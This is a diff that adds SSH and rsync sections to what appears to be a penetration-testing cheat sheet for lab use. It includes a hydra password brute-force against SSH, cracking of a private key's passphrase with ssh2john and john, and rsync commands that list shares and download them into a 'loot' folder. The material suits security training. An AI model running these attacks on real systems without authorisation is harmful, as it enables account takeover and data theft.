@@ -5,6 +5,138 @@ description: "Compare Linux remote-access services, discover SSH authentication 
 keywords: ["ssh", "rsync", "r-services", "rlogin", "private key", "22", "873", "remote access"]
 ---
 
+## ssh: choose the operation and read the result
+
+Open an SSH session or forward a port.
+
+### What the result establishes
+
+Verify the server host key, selected account and actual remote identity before interpreting shell behavior.
+
+### Prerequisites and common failures
+
+A valid account may be restricted to SFTP, a forced command or forwarding only; local and remote forwarding directions are easy to confuse.
+
+### Example 1: Commands
+
+Run in: **Kali**.
+
+```bash
+ssh USER@TARGET_IP
+chmod 600 id_rsa
+ssh -i id_rsa USER@TARGET_IP
+```
+
+### Example 2: Attacking SSH
+
+Run in: **Saved lab example**.
+
+```bash
+chmod 600 id_rsa
+ssh -i id_rsa user@<IP>
+```
+
+Saved context: [Linux Remote Access: SSH, Rsync, and R-Services — Attacking SSH](/enumeration/linux-remote-management-protocols-cheat-sheet#attacking-ssh). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+### Example 3: Attacking SSH
+
+Run in: **Saved lab example**.
+
+```bash
+hydra -l <user> -P /usr/share/wordlists/rockyou.txt -t 4 ssh://<IP>
+```
+
+Saved context: [Linux Remote Access: SSH, Rsync, and R-Services — Attacking SSH](/enumeration/linux-remote-management-protocols-cheat-sheet#attacking-ssh). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+### Example 4: Attacking SSH
+
+Run in: **Saved lab example**.
+
+```bash
+ssh2john id_rsa > id_rsa.hash             # convert the encrypted key to a crackable hash
+john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash   # recover the passphrase
+ssh -i id_rsa user@<IP>                   # now unlock the key with the cracked passphrase
+```
+
+Saved context: [Linux Remote Access: SSH, Rsync, and R-Services — Attacking SSH](/enumeration/linux-remote-management-protocols-cheat-sheet#attacking-ssh). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+### Example 5: Rsync
+
+Run in: **Saved lab example**.
+
+```bash
+sudo nmap -sV -p 873 <IP>
+nc -nv <IP> 873          # then send: @RSYNCD: 31.0  /  #list   to enumerate modules
+
+rsync -av --list-only rsync://<IP>/<share>     # list a share's contents
+rsync -av rsync://<IP>/<share> ./loot/          # download everything
+rsync -av -e "ssh -p2222" rsync://<IP>/<share> ./loot/   # over SSH, custom port
+```
+
+Saved context: [Linux Remote Access: SSH, Rsync, and R-Services — Rsync](/enumeration/linux-remote-management-protocols-cheat-sheet#rsync). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+### Example 6: Key commands
+
+Run in: **Saved lab example**.
+
+```bash
+ssh -v user@<IP>                                   # verbose: shows offered auth methods
+ssh -v user@<IP> -o PreferredAuthentications=password   # force password (for brute-force)
+ssh -i id_rsa user@<IP>                            # key-based (chmod 600 the key first)
+cat /etc/ssh/sshd_config | grep -v "#" | sed -r '/^\s*$/d'   # read server config (if on host)
+```
+
+Saved context: [Linux Remote Access: SSH, Rsync, and R-Services — Key commands](/enumeration/linux-remote-management-protocols-cheat-sheet#key-commands). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+### Example 7: Hunting for SSH private keys
+
+Run in: **Saved lab example**.
+
+```bash
+ssh-keygen -yf ~/.ssh/id_rsa
+```
+
+Saved context: [Password Attacks: Cracking, Files, and Credential Stores — Hunting for SSH private keys](/password-attacks/password-attacks-cheat-sheet#hunting-for-ssh-private-keys). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+## rsync: choose the operation and read the result
+
+List modules or copy files through rsync.
+
+### What the result establishes
+
+List the available module and readable paths, then choose a specific source and destination for a controlled transfer.
+
+### Prerequisites and common failures
+
+Trailing slashes change copy layout, and --delete can remove destination files; a module listing is not write permission.
+
+### Example 1: Commands
+
+Run in: **Kali**.
+
+```bash
+rsync rsync://TARGET_IP/
+rsync -av --list-only rsync://TARGET_IP/MODULE
+rsync -av rsync://TARGET_IP/MODULE ./received/
+```
+
+### Example 2: Rsync
+
+Run in: **Saved lab example**.
+
+```bash
+sudo nmap -sV -p 873 <IP>
+nc -nv <IP> 873          # then send: @RSYNCD: 31.0  /  #list   to enumerate modules
+
+rsync -av --list-only rsync://<IP>/<share>     # list a share's contents
+rsync -av rsync://<IP>/<share> ./loot/          # download everything
+rsync -av -e "ssh -p2222" rsync://<IP>/<share> ./loot/   # over SSH, custom port
+```
+
+Saved context: [Linux Remote Access: SSH, Rsync, and R-Services — Rsync](/enumeration/linux-remote-management-protocols-cheat-sheet#rsync). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+## Existing notes and worked examples
+
 {/* SERVICE_TOOLS_START */}
 
 ## Tools for this service
